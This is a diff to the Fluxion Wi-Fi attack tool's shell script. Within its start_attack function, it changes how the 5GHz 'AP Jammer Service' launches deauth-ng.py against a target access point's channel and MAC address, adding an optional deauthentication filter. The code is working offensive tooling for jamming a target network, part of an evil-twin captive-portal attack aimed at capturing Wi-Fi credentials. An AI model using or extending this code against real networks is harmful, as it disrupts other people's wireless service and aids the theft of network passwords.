@@ -1601,12 +1601,18 @@ start_attack() {
 
   if [ $FLUXIONEnable5GHZ -eq 1 ]; then
 
-    # TODO: make whitelist filtering for 5GHz networks
-    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
+    if [ "$CaptivePortalDeauthenticatorFilter" = "None" ]; then
+      xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
         "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC" &
-    # Save parent's pid, to get to child later.
-    CaptivePortalJammerServiceXtermPID=$!
+      # Save parent's pid, to get to child later.
+      CaptivePortalJammerServiceXtermPID=$!
+    else
+      xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
+        -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
+        "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC -o $CaptivePortalDeauthenticatorFilter" &
+      CaptivePortalJammerServiceXtermPID=$!
+    fi
 
   else
 
